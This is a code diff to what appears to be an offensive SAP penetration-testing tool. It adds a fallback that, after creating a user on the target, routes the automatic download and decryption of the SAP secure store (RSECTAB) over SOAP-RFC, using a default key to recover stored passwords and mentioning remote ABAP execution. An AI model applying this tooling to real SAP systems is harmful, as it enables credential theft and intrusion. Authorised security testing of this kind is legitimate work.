@@ -1978,6 +1978,36 @@ class SAPMAPState:
                 creds = node.best_credentials()
                 if not creds:
                     return
+
+                # Phase 3b: if the target's gateway is unreachable
+                # but we have a SOAP-RFC route, pass a soap_session
+                # so the RSECTAB-via-ABAP step routes over HTTP.
+                # Without this, every chunked RFC_ABAP_INSTALL_AND_RUN
+                # attempt would silently burn 60s on pyrfc retries —
+                # the auto-download would always fail on HTTP-only
+                # targets.
+                soap_session = None
+                try:
+                    from sapmap_gui import (
+                        find_soap_rfc_route_for_node)
+                    from sapmap_exploit import _gateway_port_reachable
+                    route = find_soap_rfc_route_for_node(self, node)
+                    if route and not _gateway_port_reachable(node):
+                        from sap_soap_basic import SOAPRFCSession
+                        soap_session = SOAPRFCSession(
+                            host=route["host"], port=route["port"],
+                            client=route["client"],
+                            user=route["user"],
+                            password=route["password"],
+                            https=route["https"],
+                            timeout=180.0,
+                        )
+                        print(f"[*] SecStore {node.sid} (auto): "
+                              f"gateway down — using SOAP-RFC "
+                              f"via {route['via_destination']}")
+                except Exception:
+                    soap_session = None
+
                 emit_finding(
                     "INFO", node.sid,
                     "Auto-downloading SecStore (RSECTAB) — triggered "
@@ -1987,7 +2017,8 @@ class SAPMAPState:
                 print(f"[*] SecStore {node.sid} (auto): starting after "
                       f"user creation — using best credentials")
                 results = download_and_decrypt(
-                    node, creds, DEFAULT_KEY_HEX, state=self)
+                    node, creds, DEFAULT_KEY_HEX, state=self,
+                    soap_session=soap_session)
                 integrate_results(node, self, results)
                 ok = [r for r in results
                       if not r.get("error") and r.get("password")]
